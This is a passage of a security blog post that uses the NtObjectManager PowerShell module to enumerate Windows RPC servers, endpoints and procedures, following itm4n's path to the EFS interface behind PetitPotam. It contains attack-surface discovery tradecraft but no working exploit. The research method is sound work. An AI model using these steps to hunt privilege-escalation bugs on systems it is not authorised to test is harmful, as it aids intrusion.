</span><span class="p">[</span><span class="n">d95afe70</span><span class="nt">-a6d5-4259-822e-2c84da1ddb0d</span><span class="p">,</span><span class="w"> </span><span class="mf">1.0</span><span class="p">]</span><span class="w"> </span><span class="n">ncacn_np</span><span class="p">:[</span><span class="n">\\PIPE\\InitShutdown</span><span class="p">]</span><span class="w">
</span><span class="p">[</span><span class="mi">76</span><span class="n">f226c3</span><span class="nt">-ec14-4325-8a99-6a46348418af</span><span class="p">,</span><span class="w"> </span><span class="mf">1.0</span><span class="p">]</span><span class="w"> </span><span class="n">ncacn_np</span><span class="p">:[</span><span class="n">\\PIPE\\InitShutdown</span><span class="p">]</span><span class="w">
</span><span class="p">[</span><span class="mi">76</span><span class="n">f226c3</span><span class="nt">-ec14-4325-8a99-6a46348418af</span><span class="p">,</span><span class="w"> </span><span class="mf">1.0</span><span class="p">]</span><span class="w"> </span><span class="n">ncacn_np</span><span class="p">:[</span><span class="n">\\PIPE\\InitShutdown</span><span class="p">]</span><span class="w">
</span><span class="p">[</span><span class="mi">7</span><span class="n">f1343fe</span><span class="nt">-50a9-4927-a778-0c5859517bac</span><span class="p">,</span><span class="w"> </span><span class="mf">1.0</span><span class="p">]</span><span class="w"> </span><span class="n">ncacn_np</span><span class="p">:[</span><span class="n">\\PIPE\\wkssvc</span><span class="p">]</span><span class="w">
</span><span class="p">[</span><span class="mi">33</span><span class="n">d84484</span><span class="nt">-3626-47ee-8c6f-e7e98b113be1</span><span class="p">,</span><span class="w"> </span><span class="mf">2.0</span><span class="p">]</span><span class="w"> </span><span class="n">ncacn_np</span><span class="p">:[</span><span class="n">\\PIPE\\atsvc</span><span class="p">]</span><span class="w">

</span></pre></table></code></div></div><p>You don’t have to rely on the RPC servers you have already parsed to get a list of endpoints. The RPC <a href="https://www.windows-security.org/windows-service/rpc-endpoint-mapper">Endpoint Mapper</a> is running. Use the following command to query it.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\user</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">get-help</span><span class="w">  </span><span class="nx">Get-RpcEndpoint</span><span class="w"> </span><span class="nt">-examples</span><span class="w">

</span><span class="n">NAME</span><span class="w">
    </span><span class="nx">Get-RpcEndpoint</span><span class="w">

</span><span class="n">SYNOPSIS</span><span class="w">
    </span><span class="nx">Gets</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">endpoints</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">RPC</span><span class="w"> </span><span class="nx">interface</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">local</span><span class="w"> </span><span class="nx">endpoint</span><span class="w"> </span><span class="nx">mapper</span><span class="w"> </span><span class="nx">or</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">brute</span><span class="w"> </span><span class="nx">force.</span><span class="w">

</span></pre></table></code></div></div><p>These are the endpoints reported by the endpoint mapper on my Windows 11 machine.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\user</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-RpcEndpoint</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">Select-String</span><span class="w"> </span><span class="nx">ncacn_np</span><span class="w">

</span><span class="p">[</span><span class="mi">650</span><span class="n">a7e26</span><span class="nt">-eab8-5533-ce43-9c1dfce11511</span><span class="p">,</span><span class="w"> </span><span class="mf">1.0</span><span class="p">]</span><span class="w"> </span><span class="n">ncacn_np:</span><span class="p">[</span><span class="n">\\PIPE\\ROUTER</span><span class="p">]</span><span class="w">
</span><span class="p">[</span><span class="mi">2</span><span class="n">f5f6521</span><span class="nt">-cb55-1059-b446-00df0bce31db</span><span class="p">,</span><span class="w"> </span><span class="mf">1.0</span><span class="p">]</span><span class="w"> </span><span class="n">ncacn_np</span><span class="p">:[</span><span class="n">\\pipe\\tapsrv</span><span class="p">]</span><span class="w">
</span><span class="p">[</span><span class="mi">29770</span><span class="n">a8f</span><span class="nt">-829b-4158-90a2-78cd488501f7</span><span class="p">,</span><span class="w"> </span><span class="mf">1.0</span><span class="p">]</span><span class="w"> </span><span class="n">ncacn_np</span><span class="p">:[</span><span class="n">\\pipe\\SessEnvPublicRpc</span><span class="p">]</span><span class="w">
</span><span class="p">[</span><span class="mi">7</span><span class="n">f1343fe</span><span class="nt">-50a9-4927-a778-0c5859517bac</span><span class="p">,</span><span class="w"> </span><span class="mf">1.0</span><span class="p">]</span><span class="w"> </span><span class="n">ncacn_np</span><span class="p">:[</span><span class="n">\\PIPE\\wkssvc</span><span class="p">]</span><span class="w">
</span><span class="p">[</span><span class="n">f6beaff7</span><span class="nt">-1e19-4fbb-9f8f-b89e2018337c</span><span class="p">,</span><span class="w"> </span><span class="mf">1.0</span><span class="p">]</span><span class="w"> </span><span class="n">ncacn_np</span><span class="p">:[</span><span class="n">\\pipe\\eventlog</span><span class="p">]</span><span class="w">
</span><span class="p">[</span><span class="mi">1</span><span class="n">ff70682</span><span class="nt">-0a51-30e8-076d-740be8cee98b</span><span class="p">,</span><span class="w"> </span><span class="mf">1.0</span><span class="p">]</span><span class="w"> </span><span class="n">ncacn_np</span><span class="p">:[</span><span class="n">\\PIPE\\atsvc</span><span class="p">]</span><span class="w">
</span><span class="p">[</span><span class="mi">378</span><span class="n">e52b0</span><span class="nt">-c0a9-11cf-822d-00aa0051e40f</span><span class="p">,</span><span class="w"> </span><span class="mf">1.0</span><span class="p">]</span><span class="w"> </span><span class="n">ncacn_np</span><span class="p">:[</span><span class="n">\\PIPE\\atsvc</span><span class="p">]</span><span class="w">
</span><span class="p">[</span><span class="mi">33</span><span class="n">d84484</span><span class="nt">-3626-47ee-8c6f-e7e98b113be1</span><span class="p">,</span><span class="w"> </span><span class="mf">2.0</span><span class="p">]</span><span class="w"> </span><span class="n">ncacn_np</span><span class="p">:[</span><span class="n">\\PIPE\\atsvc</span><span class="p">]</span><span class="w">
</span><span class="p">[</span><span class="mi">86</span><span class="n">d35949</span><span class="nt">-83c9-4044-b424-db363231fd0c</span><span class="p">,</span><span class="w"> </span><span class="mf">1.0</span><span class="p">]</span><span class="w"> </span><span class="n">ncacn_np</span><span class="p">:[</span><span class="n">\\PIPE\\atsvc</span><span class="p">]</span><span class="w">
</span><span class="p">[</span><span class="mi">3</span><span class="n">a9ef155</span><span class="nt">-691d-4449-8d05-09ad57031823</span><span class="p">,</span><span class="w"> </span><span class="mf">1.0</span><span class="p">]</span><span class="w"> </span><span class="n">ncacn_np</span><span class="p">:[</span><span class="n">\\PIPE\\atsvc</span><span class="p">]</span><span class="w">
</span><span class="p">[</span><span class="mi">76</span><span class="n">f226c3</span><span class="nt">-ec14-4325-8a99-6a46348418af</span><span class="p">,</span><span class="w"> </span><span class="mf">1.0</span><span class="p">]</span><span class="w"> </span><span class="n">ncacn_np</span><span class="p">:[</span><span class="n">\\PIPE\\InitShutdown</span><span class="p">]</span><span class="w">
</span><span class="p">[</span><span class="n">d95afe70</span><span class="nt">-a6d5-4259-822e-2c84da1ddb0d</span><span class="p">,</span><span class="w"> </span><span class="mf">1.0</span><span class="p">]</span><span class="w"> </span><span class="n">ncacn_np</span><span class="p">:[</span><span class="n">\\PIPE\\InitShutdown</span><span class="p">]</span><span class="w">
</span><span class="p">[</span><span class="mi">12345778</span><span class="nt">-1234-abcd-ef00-0123456789ac</span><span class="p">,</span><span class="w"> </span><span class="mf">1.0</span><span class="p">]</span><span class="w"> </span><span class="n">ncacn_np</span><span class="p">:[</span><span class="n">\\pipe\\lsass</span><span class="p">]</span><span class="w">
</span><span class="p">[</span><span class="n">b25a52bf</span><span class="nt">-e5dd-4f4a-aea6-8ca7272a0e86</span><span class="p">,</span><span class="w"> </span><span class="mf">2.0</span><span class="p">]</span><span class="w"> </span><span class="n">ncacn_np</span><span class="p">:[</span><span class="n">\\pipe\\lsass</span><span class="p">]</span><span class="w">
</span><span class="p">[</span><span class="mi">8</span><span class="n">fb74744</span><span class="nt">-b2ff-4c00-be0d-9ef9a191fe1b</span><span class="p">,</span><span class="w"> </span><span class="mf">1.0</span><span class="p">]</span><span class="w"> </span><span class="n">ncacn_np</span><span class="p">:[</span><span class="n">\\pipe\\lsass</span><span class="p">]</span><span class="w">
</span><span class="p">[</span><span class="mi">51</span><span class="n">a227ae</span><span class="nt">-825b-41f2-b4a9-1ac9557a1018</span><span class="p">,</span><span class="w"> </span><span class="mf">1.0</span><span class="p">]</span><span class="w"> </span><span class="n">ncacn_np</span><span class="p">:[</span><span class="n">\\pipe\\lsass</span><span class="p">]</span><span class="w">
</span></pre></table></code></div></div><p>Fewer endpoints reported in the dynamic query because <strong>NtObjectManager will find the RPC servers whether or not they are running or advertised in the mapper</strong>.</p><h4 id="procedures"><span class="mr-2">Procedures</span><a href="#procedures" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Sometimes when we are looking for interesting procedures, an interesting keyword is all that we need. Perhaps the term “connect” or “set” or even “file” can be enough to discover interesting procedures. <em>Itm4n</em> qualifies an interesting procedure in the article as one with the word “file” in the procedure name.</p><blockquote><p>File operations initiated by low-privileged users and performed by privileged processes (such as services running as <code class="language-plaintext highlighter-rouge">SYSTEM</code>) are always interesting to investigate because they might lead to local privilege escalation (or even remote code execution in some cases). On top of that, they are relatively easy to find and visualize, using <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon">Process Monitor</a> for instance. <a href="https://itm4n.github.io/from-rpcview-to-petitpotam/">From RpcView to PetitPotam</a></p></blockquote><p>For RpcView the discovery of procedure names is a tedious, even if you know what you a looking for. You have to click each interface to see the list of procedures.</p><blockquote><p>When clicking on the LSASS process (1), we can see that it contains many RPC interfaces. So we go through them one by one and we stop on the one with the GUID <code class="language-plaintext highlighter-rouge">c681d488-d850-11d0-8c52-00c04fd90f7e</code> (2) because it exposes several procedures that <strong>seem to perform file operations (according to their name)</strong> (3). <a href="https://itm4n.github.io/from-rpcview-to-petitpotam/">From RpcView to PetitPotam</a></p></blockquote><p>It can filter, just not by procedure name.</p><p><img data-src="/assets/img/2022-06-23-from-ntobjectmanager-to-petitpotam/rpcview-filter.png" alt="rpcview-filter" class="shadow" data-proofer-ignore><em>RpcView Filters</em></p><p>Here is where NtObjectManager shines. If you want to find interesting procedure names you can use the provided cmdlet <code class="language-plaintext highlighter-rouge">Select-RpcServer</code>.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\user</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-Help</span><span class="w"> </span><span class="nx">Select-RpcServer</span><span class="w"> </span><span class="nt">-Examples</span><span class="w">

</span><span class="n">NAME</span><span class="w">
    </span><span class="nx">Select-RpcServer</span><span class="w">

</span><span class="n">SYNOPSIS</span><span class="w">
    </span><span class="nx">Selects</span><span class="w"> </span><span class="nx">RPC</span><span class="w"> </span><span class="nx">server</span><span class="w"> </span><span class="nx">objects</span><span class="w"> </span><span class="nx">based</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="nx">some</span><span class="w"> </span><span class="nx">specific</span><span class="w"> </span><span class="nx">criteria.</span><span class="w">


    </span><span class="o">----------</span><span class="w">  </span><span class="n">EXAMPLE</span><span class="w"> </span><span class="nx">1</span><span class="w">  </span><span class="o">----------</span><span class="w">

    </span><span class="nv">$rpc</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-RpcServer</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s2">"Start"</span><span class="w">

    </span><span class="n">Select</span><span class="w"> </span><span class="nx">all</span><span class="w"> </span><span class="nx">servers</span><span class="w"> </span><span class="nx">which</span><span class="w"> </span><span class="nx">have</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">procedure</span><span class="w"> </span><span class="nx">containing</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">text</span><span class="w"> </span><span class="nx">Start.</span><span class="w">
    </span><span class="o">----------</span><span class="w">  </span><span class="n">EXAMPLE</span><span class="w"> </span><span class="nx">2</span><span class="w">  </span><span class="o">----------</span><span class="w">

    </span><span class="nv">$rpc</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-RpcServer</span><span class="w"> </span><span class="nt">-SystemHandle</span><span class="w">

    </span><span class="n">Select</span><span class="w"> </span><span class="nx">all</span><span class="w"> </span><span class="nx">servers</span><span class="w"> </span><span class="nx">which</span><span class="w"> </span><span class="nx">have</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">procedure</span><span class="w"> </span><span class="nx">which</span><span class="w"> </span><span class="nx">take</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">system</span><span class="w"> </span><span class="nx">handle</span><span class="w"> </span><span class="nx">parameter.</span><span class="w">
    </span><span class="o">----------</span><span class="w">  </span><span class="n">EXAMPLE</span><span class="w"> </span><span class="nx">3</span><span class="w">  </span><span class="o">----------</span><span class="w">

    </span><span class="nv">$rpc</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-RpcServer</span><span class="w"> </span><span class="nt">-SystemHandle</span><span class="w"> </span><span class="nt">-SystemHandleType</span><span class="w"> </span><span class="nx">File</span><span class="w">

    </span><span class="n">Select</span><span class="w"> </span><span class="nx">all</span><span class="w"> </span><span class="nx">servers</span><span class="w"> </span><span class="nx">which</span><span class="w"> </span><span class="nx">have</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">procedure</span><span class="w"> </span><span class="nx">which</span><span class="w"> </span><span class="nx">take</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">system</span><span class="w"> </span><span class="nx">handle</span><span class="w"> </span><span class="nx">parameter</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">type</span><span class="w"> </span><span class="nx">File.</span><span class="w">
</span></pre></table></code></div></div><p>To find RPC servers with <em>procedure</em> names that include the keyword ‘file’:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\user</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$allrpc</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-RpcServer</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'file'</span><span class="w">

</span><span class="n">Name</span><span class="w">                                                         </span><span class="nx">UUID</span><span class="w">                                 </span><span class="nx">Ver</span><span class="w"> </span><span class="nx">Procs</span><span class="w"> </span><span class="nx">EPs</span><span class="w"> </span><span class="nx">Service</span><span class="w">                </span><span class="nx">Running</span><span class="w">
</span><span class="o">----</span><span class="w">                                                         </span><span class="o">----</span><span class="w">                                 </span><span class="o">---</span><span class="w"> </span><span class="o">-----</span><span class="w"> </span><span class="o">---</span><span class="w"> </span><span class="o">-------</span><span class="w">                </span><span class="o">-------</span><span class="w">
</span><span class="n">AggregatorHost.exe</span><span class="w">                                           </span><span class="nx">7df1ceae-de4e-4e6f-ab14-49636e7c2052</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">2</span><span class="w">     </span><span class="nx">1</span><span class="w">                          </span><span class="nx">False</span><span class="w">
</span><span class="n">appidsvc.dll</span><span class="w">                                                 </span><span class="nx">8a7b5006-cc13-11db-9705-005056c00008</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">4</span><span class="w">     </span><span class="nx">0</span><span class="w">   </span><span class="nx">AppIDSvc</span><span class="w">               </span><span class="nx">False</span><span class="w">
</span><span class="n">appinfo.dll</span><span class="w">                                                  </span><span class="nx">0497b57d-2e66-424f-a0c6-157cd5d41700</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">9</span><span class="w">     </span><span class="nx">1</span><span class="w">   </span><span class="nx">Appinfo</span><span class="w">                </span><span class="nx">True</span><span class="w">
</span><span class="n">AppVEntSubsystemController.dll</span><span class="w">                               </span><span class="nx">af1e812f-2d47-4c99-9b36-15984de66d89</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">2</span><span class="w">     </span><span class="nx">0</span><span class="w">                          </span><span class="nx">False</span><span class="w">
</span><span class="n">audiosrv.dll</span><span class="w">                                                 </span><span class="nx">2b29a846-9ad7-49b6-bc52-b019c5c0c56f</span><span class="w"> </span><span class="nx">1.6</span><span class="w"> </span><span class="nx">55</span><span class="w">    </span><span class="nx">0</span><span class="w">   </span><span class="nx">Audiosrv</span><span class="w">               </span><span class="nx">True</span><span class="w">
</span><span class="n">BFE.DLL</span><span class="w">                                                      </span><span class="nx">dd490425-5325-4565-b774-7e27d6c09c24</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">194</span><span class="w">   </span><span class="nx">1</span><span class="w">   </span><span class="nx">BFE</span><span class="w">                    </span><span class="nx">True</span><span class="w">
</span><span class="n">CmService.dll</span><span class="w">                                                </span><span class="nx">f1c37891-201f-4aa3-94b1-a5d131b04920</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">46</span><span class="w">    </span><span class="nx">1</span><span class="w">   </span><span class="nx">CmService</span><span class="w">              </span><span class="nx">True</span><span class="w">
</span><span class="n">DispBroker.Desktop.dll</span><span class="w">                                       </span><span class="nx">509bc7ae-77be-4ee8-b07c-0d096bb44345</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">10</span><span class="w">    </span><span class="nx">2</span><span class="w">   </span><span class="nx">DispBrokerDesktopSvc</span><span class="w">   </span><span class="nx">True</span><span class="w">
</span><span class="n">dot3svc.dll</span><span class="w">                                                  </span><span class="nx">1bddb2a6-c0c3-41be-8703-ddbdf4f0e80a</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">21</span><span class="w">    </span><span class="nx">0</span><span class="w">   </span><span class="nx">dot3svc</span><span class="w">                </span><span class="nx">False</span><span class="w">
</span><span class="n">dssvc.dll</span><span class="w">                                                    </span><span class="nx">bf4dc912-e52f-4904-8ebe-9317c1bdd497</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">8</span><span class="w">     </span><span class="nx">2</span><span class="w">   </span><span class="nx">DsSvc</span><span class="w">                  </span><span class="nx">True</span><span class="w">
</span><span class="n">dusmsvc.dll</span><span class="w">                                                  </span><span class="nx">c27f3c08-92ba-478c-b446-b419c4cef0e2</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">26</span><span class="w">    </span><span class="nx">1</span><span class="w">   </span><span class="nx">DusmSvc</span><span class="w">                </span><span class="nx">True</span><span class="w">
</span><span class="n">edgehtml.dll</span><span class="w">                                                 </span><span class="nx">9ccb59aa-1358-4169-aebb-ed83357d6304</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">173</span><span class="w">   </span><span class="nx">0</span><span class="w">                          </span><span class="nx">False</span><span class="w">
</span><span class="n">efslsaext.dll</span><span class="w">                                                </span><span class="nx">c681d488-d850-11d0-8c52-00c04fd90f7e</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">21</span><span class="w">    </span><span class="nx">0</span><span class="w">                          </span><span class="nx">False</span><span class="w">
</span><span class="n">efssvc.dll</span><span class="w">                                                   </span><span class="nx">df1941c5-fe89-4e79-bf10-463657acf44d</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">53</span><span class="w">    </span><span class="nx">2</span><span class="w">   </span><span class="nx">EFS</span><span class="w">                    </span><span class="nx">False</span><span class="w">
</span><span class="n">efssvc.dll</span><span class="w">                                                   </span><span class="nx">04eeb297-cbf4-466b-8a2a-bfd6a2f10bba</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">7</span><span class="w">     </span><span class="nx">2</span><span class="w">   </span><span class="nx">EFS</span><span class="w">                    </span><span class="nx">False</span><span class="w">
</span><span class="n">FXSSVC.exe</span><span class="w">                                                   </span><span class="nx">ea0a3165-4834-11d2-a6f8-00c04fa346cc</span><span class="w"> </span><span class="nx">4.0</span><span class="w"> </span><span class="nx">105</span><span class="w">   </span><span class="nx">0</span><span class="w">   </span><span class="nx">Fax</span><span class="w">                    </span><span class="nx">False</span><span class="w">
</span><span class="n">lpasvc.dll</span><span class="w">                                                   </span><span class="nx">4f4fa786-2f8f-49e8-8aae-6669febd5d1d</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">24</span><span class="w">    </span><span class="nx">0</span><span class="w">   </span><span class="nx">wlpasvc</span><span class="w">                </span><span class="nx">False</span><span class="w">
</span><span class="n">lsasrv.dll</span><span class="w">                                                   </span><span class="nx">12345778-1234-abcd-ef00-0123456789ab</span><span class="w"> </span><span class="nx">0.0</span><span class="w"> </span><span class="nx">134</span><span class="w">   </span><span class="nx">0</span><span class="w">                          </span><span class="nx">False</span><span class="w">
</span><span class="n">netprofmsvc.dll</span><span class="w">                                              </span><span class="nx">bd6ca954-842e-468f-8b07-89cbfa9522dc</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">1</span><span class="w">     </span><span class="nx">2</span><span class="w">   </span><span class="nx">netprofm</span><span class="w">               </span><span class="nx">True</span><span class="w">
</span><span class="n">pcasvc.dll</span><span class="w">                                                   </span><span class="nx">0767a036-0d22-48aa-ba69-b619480f38cb</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">8</span><span class="w">     </span><span class="nx">1</span><span class="w">   </span><span class="nx">PcaSvc</span><span class="w">                 </span><span class="nx">True</span><span class="w">
</span><span class="n">PimIndexMaintenance.dll</span><span class="w">                                      </span><span class="nx">43890c94-bfd7-4655-ad6a-b4a68397cdcb</span><span class="w"> </span><span class="nx">0.0</span><span class="w"> </span><span class="nx">14</span><span class="w">    </span><span class="nx">0</span><span class="w">   </span><span class="nx">PimIndexMaintenanceSvc</span><span class="w"> </span><span class="nx">False</span><span class="w">
</span><span class="n">profsvc.dll</span><span class="w">                                                  </span><span class="nx">326731e3-c1c0-4a69-ae20-7d9044a4ea5c</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">8</span><span class="w">     </span><span class="nx">0</span><span class="w">   </span><span class="nx">ProfSvc</span><span class="w">                </span><span class="nx">True</span><span class="w">
</span><span class="n">rascustom.dll</span><span class="w">                                                </span><span class="nx">650a7e26-eab8-5533-ce43-9c1dfce11511</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">40</span><span class="w">    </span><span class="nx">4</span><span class="w">                          </span><span class="nx">False</span><span class="w">
</span><span class="n">scesrv.dll</span><span class="w">                                                   </span><span class="nx">93149ca2-973b-11d1-8c39-00c04fb984f9</span><span class="w"> </span><span class="nx">0.0</span><span class="w"> </span><span class="nx">34</span><span class="w">    </span><span class="nx">0</span><span class="w">                          </span><span class="nx">False</span><span class="w">
</span><span class="n">SessEnv.dll</span><span class="w">                                                  </span><span class="nx">b12fd546-c875-4b41-97d8-950487662202</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">9</span><span class="w">     </span><span class="nx">0</span><span class="w">   </span><span class="nx">SessionEnv</span><span class="w">             </span><span class="nx">True</span><span class="w">
</span><span class="n">spoolsv.exe</span><span class="w">                                                  </span><span class="nx">12345678-1234-abcd-ef00-0123456789ab</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">125</span><span class="w">   </span><span class="nx">2</span><span class="w">   </span><span class="nx">Spooler</span><span class="w">                </span><span class="nx">True</span><span class="w">

</span><span class="c">#several lines omitted...</span><span class="w">
</span></pre></table></code></div></div><p>After reviewing that output, you might select one of the interfaces and find out which specific <em>procedure</em> names match:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\user</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$allrpc</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">InterfaceId</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s1">'c681d488-d850-11d0-8c52-00c04fd90f7e'</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">Procedures</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w">  </span><span class="n">Out-String</span><span class="w"> </span><span class="nt">-Stream</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-String</span><span class="w"> </span><span class="nx">file</span><span class="w">

</span><span class="n">Name</span><span class="w">             </span><span class="p">:</span><span class="w"> </span><span class="nx">EfsRpcOpenFileRaw_Downlevel</span><span class="w">
</span><span class="n">Name</span><span class="w">             </span><span class="p">:</span><span class="w"> </span><span class="nx">EfsRpcReadFileRaw_Downlevel</span><span class="w">
</span><span class="n">Name</span><span class="w">             </span><span class="p">:</span><span class="w"> </span><span class="nx">EfsRpcWriteFileRaw_Downlevel</span><span class="w">
</span><span class="n">Name</span><span class="w">             </span><span class="p">:</span><span class="w"> </span><span class="nx">EfsRpcEncryptFileSrv_Downlevel</span><span class="w">
</span><span class="n">Name</span><span class="w">             </span><span class="p">:</span><span class="w"> </span><span class="nx">EfsRpcDecryptFileSrv_Downlevel</span><span class="w">
</span><span class="n">Name</span><span class="w">             </span><span class="p">:</span><span class="w"> </span><span class="nx">EfsRpcQueryUsersOnFile_Downlevel</span><span class="w">
</span><span class="n">Name</span><span class="w">             </span><span class="p">:</span><span class="w"> </span><span class="nx">EfsRpcRemoveUsersFromFile_Downlevel</span><span class="w">
</span><span class="n">Name</span><span class="w">             </span><span class="p">:</span><span class="w"> </span><span class="nx">EfsRpcAddUsersToFile_Downlevel</span><span class="w">
</span><span class="n">Name</span><span class="w">             </span><span class="p">:</span><span class="w"> </span><span class="nx">EfsRpcSetFileEncryptionKey_Downlevel</span><span class="w">
</span><span class="n">Name</span><span class="w">             </span><span class="p">:</span><span class="w"> </span><span class="nx">EfsRpcFileKeyInfo_Downlevel</span><span class="w">
</span><span class="n">Name</span><span class="w">             </span><span class="p">:</span><span class="w"> </span><span class="nx">EfsRpcDuplicateEncryptionInfoFile_Downlevel</span><span class="w">
</span><span class="n">Name</span><span class="w">             </span><span class="p">:</span><span class="w"> </span><span class="nx">EfsUsePinForEncryptedFiles_Downlevel</span><span class="w">
</span><span class="n">Name</span><span class="w">             </span><span class="p">:</span><span class="w"> </span><span class="nx">EfsRpcAddUsersToFileEx_Downlevel</span><span class="w">
</span><span class="n">Name</span><span class="w">             </span><span class="p">:</span><span class="w"> </span><span class="nx">EfsRpcFileKeyInfoEx_Downlevel</span><span class="w">
</span><span class="n">Name</span><span class="w">             </span><span class="p">:</span><span class="w"> </span><span class="nx">EfsRpcGetEncryptedFileMetadata_Downlevel</span><span class="w">
</span><span class="n">Name</span><span class="w">             </span><span class="p">:</span><span class="w"> </span><span class="nx">EfsRpcSetEncryptedFileMetadata_Downlevel</span><span class="w">

</span></pre></table></code></div></div><h4 id="bonus---procedure-parameters"><span class="mr-2">Bonus - Procedure Parameters</span><a href="#bonus---procedure-parameters" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>You can even see what types of RpcServers accept specific types of parameters for their <em>procedures</em>:</p><p>Tab complete to see the options for types:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
